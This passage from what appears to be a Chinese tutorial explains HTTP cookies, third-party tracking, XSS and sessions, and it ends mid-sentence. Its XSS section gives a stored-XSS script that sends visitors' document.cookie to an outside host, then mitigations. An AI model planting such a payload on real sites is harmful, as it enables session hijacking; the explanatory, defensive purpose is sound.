http请求是无状态的，但是我们需要去保持一些状态，于是诞生了cookie头部

cookie可以是请求头部，也可以是响应头部

# cookie
通常服务器会给响应报文添加 Set-Cookie:.... 头部，来添加cookie

在服务器选择返回的cookie通常有多个属性

```
    type Cookie struct {
        Name  string //key-val
        Value string

        Path       string    // optional，当请求匹配上该路径时才携带cookie
        Domain     string    // optional，当请求该域名时才携带cookie
        Expires    time.Time // optional，持久性cookie，这个时间点后，浏览器才会销毁cookie
        RawExpires string    // for reading cookies only

        // MaxAge=0 means no 'Max-Age' attribute specified.,会在退出浏览器后删除该cookie
        // MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'，马上，现在就给删了
        // MaxAge>0 means Max-Age attribute present and given in seconds，经过多少秒后失效
        MaxAge   int
        Secure   bool   //true，cookie只有在https加密的情况下才会被发给客户端
        HttpOnly bool  //客户端无法通过js获取cookie，但是并不能完全防止xss攻击
        SameSite SameSite   //
        Raw      string
        Unparsed []string // Raw text of unparsed attribute-value pairs，不对转义过的键值对进行解析
    }
```

    Set-Cookie:key="i am a cookie"; Max-Age=10; HttpOnly

如果不设置Max-Age或值为0，则浏览器获取cookie后会暂存，下次再访问获取到cookie的domain+path网页，会携带cookie，直到浏览器被关闭后才清除

如果值>0，则会缓存，直到过期被删除

浏览器通过Cookie头部携带接受的和缓存的cookie发送给服务器

# 第三方cookie
假设a、b、c 三个页面植入了 d 公司的广告，你请求这三个页面都会再去请求 d 服务器的一个广告图片

1. 你请求了a页面，解析页面后去请求d服务器的一个图片，d服务器返回给你一个cookie：user="kanggege";page="a";domain="advertisement.com"
2. 后来你请求b页面，同样要请求一个d服务器的广告图片,cookie：user="kanggege";page="b";domain="advertisement.com"
3. c页面,cookie：user="kanggege";page="c";domain="advertisement.com"

通过识别你的身份和你访问网页的标识，可以知道你的访问记录，更偏向于访问哪种类型的网站，从而给你推送对应的广告

甚至追踪你所有的访问记录

# 跨站脚本XSS
假设有一个论坛网站，我在下面留言

    <script>window.location=http://abc.com?cookie=docuemnt.cookie</script>

我的留言被存入数据库，并再其他人访问时从数据库查询出来，并加载到页面中，则该脚本生效，我就获取到了访问者的cookie

一般cookie会存储登录状态，这是我就可以用这个cookie伪装他的身份登录

解决办法：可以通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代码将不能操作cookie。

最好还是要将从用户得到的信息在存入数据库之前进行转义，这样更安全

# session
通过客户端的cookieid可以在服务器上维护一个唯一的session，对应这个用户

所谓session就是一个数据结构，类似于map\[key]data，cookie就是key，通过key得到data，这个data可以存入任何数据或取出已经存入的数据

所以可以通过session维护用户的登录操作，具体实现如下：

1. 接受倒一个请求，获取请求中request的cookie值，如果能获取到cookieid，则用户已经登录，通过cookieid获取session，从session中获取用户身份信息，否则用户未登录
2. 跳转用户登录，验证账号密码，response中设置cookieid，为cookieid创建session，将session中存入一个数据(例如：userid)保存用户登录状态
3. 单点登录：如果用户使用其他浏览器(没有cookieid)，或者在其他主机登录，总之没有cookieid，则